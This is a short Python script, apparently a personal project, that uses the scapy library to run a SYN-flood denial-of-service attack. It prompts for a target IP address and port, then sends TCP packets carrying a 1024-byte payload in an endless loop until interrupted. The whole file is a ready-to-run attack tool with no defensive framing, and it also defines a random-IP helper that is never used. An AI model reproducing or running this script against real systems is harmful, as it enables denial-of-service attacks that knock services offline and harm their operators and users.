# -*- coding: utf-8 -*-
"""
Created on Sun Oct 31 10:28:04 2021

@author: JEEVA R
"""

from scapy.all import *
import os
import sys
import random


#Funtion for generating random ports
def randInt():
    return RandShort()


#Function for randomly generating IP addresses
def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip    


#Function for SYN Flooding attack
def SYN_Flood(dstIP,dstPort):
    print("\nPackets are sending ...")
    s_port = randInt()
    #s_eq = randInt()

    #IP Packet
    IP_Packet = IP ()
    IP_Packet.dst = dstIP

    #TCP Packet
    TCP_Packet = TCP()
    TCP_Packet.sport = s_port
    TCP_Packet.dport = dstPort
    
    print("\nHit Ctrl+C to stop")
    
    #Sending Packets
    send(IP_Packet/TCP_Packet/Raw(b"X"*1024), verbose=0,loop=1)
   


def inputs():
    print(" \n\n          -- SYN Flooding --         ")
    dstIP = input("\nTarget IP : ")
    dstPort = int(input("Target Port : "))
    return dstIP,dstPort
    

if __name__ == '__main__':
    try:
         dstIP,dstPort = inputs()
         SYN_Flood(dstIP,dstPort)
    except KeyboardInterrupt:
        print ('KeyBoardInterrupt exception')
    
